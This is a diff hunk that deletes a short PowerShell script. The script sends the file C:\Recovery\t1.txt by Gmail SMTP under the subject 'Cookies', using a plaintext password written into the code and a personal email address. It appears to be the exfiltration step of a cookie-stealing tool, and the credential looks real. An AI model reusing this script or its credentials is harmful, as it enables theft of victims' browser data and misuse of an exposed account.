@@ -1,9 +1,0 @@
-$from = "nazaninn.soltanifar@gmail.com"
-$to = "nazaninn.soltanifar@gmail.com"
-$attachment = 'C:\Recovery\t1.txt'
-$smtp = "smtp.gmail.com"
-$secpasswd = ConvertTo-SecureString "tlhtabqiizrqslgj" -AsPlainText -Force
-$cred = New-Object System.Management.Automation.PSCredential ($from, $secpasswd)
-$subject = "Cookies"
-
-Send-MailMessage -Credential $cred -UseSsl -Subject $subject -From $from -To $to -Attachments $attachment -SmtpServer $smtp
